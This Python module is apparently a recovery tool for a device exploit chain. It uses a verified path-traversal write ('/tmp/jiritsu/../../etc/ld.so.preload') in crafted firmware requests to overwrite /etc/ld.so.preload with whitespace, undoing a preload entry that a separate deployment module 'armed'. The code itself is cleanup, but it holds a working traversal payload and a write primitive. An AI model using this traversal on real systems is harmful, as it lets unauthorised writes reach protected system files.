"""Neutralise /etc/ld.so.preload through the verified traversal write.

Recovery tool. It should be run when a deployment reported `disarmed: false`,
or whenever the preload state is unknown.

What an armed entry actually does depends on why the object does not load: a
missing or unloadable object is ignored with a warning and the program continues,
while a symbol-version, relocation or constructor failure is fatal for every
dynamic exec. Either way the entry is worth clearing, and it persists across
reboots because /etc lives on a writable partition.

This module replaces the file with whitespace only. glibc's preload parser splits
on whitespace, so the result contributes no libraries and has no effect.

It is deliberately independent of the deployment module so it can be run on its
own, and it never writes anything except that one file.
"""
import hashlib
import struct

from jiritsu_version_read import AUTHORIZED_MAX_BYTES, authorize, exchange

PRELOAD_WIRE_PATH = "/tmp/jiritsu/../../etc/ld.so.preload"
PRELOAD_PATH = "/etc/ld.so.preload"
# Whitespace-only and longer than any entry we can write: glibc splits the
# preload file on whitespace, so this yields zero libraries whether or not
# the firmware truncates on overwrite (that semantic is unverified).
NEUTRAL_CONTENT = b"\n" * 512
ABSENT_RESULT = 0x10000006


def _select():
    return struct.pack("<HH", 0x1001, 0x0f) + b"\0" + PRELOAD_WIRE_PATH.encode("ascii") + b"\0"


def _write():
    return struct.pack("<HH", 0x1001, 0x10) + b"\x00\xff\x00" + NEUTRAL_CONTENT


def _read():
    return struct.pack("<HH", 0x1001, 0x11) + b"\x00\xff\x00"


def build_requests():
    return {"select": _select(), "write": _write(), "read": _read()}


def is_neutral(content):
    """True when the content contributes no libraries.

    glibc's preload parser splits on whitespace, so absent, empty and whitespace-only
    files all load nothing. The firmware's overwrite appears to work within the
    existing file size (writing to a 0-byte file failed with 0x10000009), so a
    whitespace-only file must be recognised as already neutral instead of being
    rewritten — that write cannot succeed and reporting failure would be misleading.
    """
    return content is None or content.strip() == b""


def read_preload(transport, log):
    """Return the current preload content, or None when the file is absent."""
    from jiritsu_version_read import JiritsuResultError

    exchange(transport, _select(), 4, log)
    try:
        return exchange(transport, _read(), 4 + AUTHORIZED_MAX_BYTES, log)
    except JiritsuResultError as error:
        if error.result == ABSENT_RESULT:
            return None
        raise


def clear_preload(transport, log):
    """Make /etc/ld.so.preload contribute no libraries, and verify it by read-back.

    A whitespace-only or empty file already achieves that, and the firmware's
    overwrite appears to work only within the existing file size (writing 512 bytes
    into a 0-byte file failed with 0x10000009), so an already-neutral file is reported
    as such instead of being rewritten and then reported as a failure.
    """
    requests = build_requests()
    authorize(transport, tuple(requests.values()), max_bytes=AUTHORIZED_MAX_BYTES,
              max_requests=len(requests))

    before = read_preload(transport, log)
    log("preload_before_clear", content_hex=None if before is None else before.hex(),
        bytes=None if before is None else len(before))
    already_neutral = is_neutral(before)

    if not already_neutral:
        exchange(transport, requests["select"], 4, log)
        exchange(transport, requests["write"], 4, log)

    after = read_preload(transport, log)
    record = {
        "path": PRELOAD_PATH,
        "before_hex": None if before is None else before.hex(),
        "before_sha256": None if before is None else hashlib.sha256(before).hexdigest(),
        "after_hex": None if after is None else after.hex(),
        "already_neutral": already_neutral,
        "neutralised": is_neutral(after),
    }
    # Log success only after the read-back, never before it.
    if record["neutralised"]:
        log("preload_neutralised", wrote=not already_neutral,
            bytes=None if after is None else len(after))
    log("preload_clear_result", **record)
    if not record["neutralised"]:
        raise ValueError(f"preload still contains data after the clear: {after!r}")
    return record

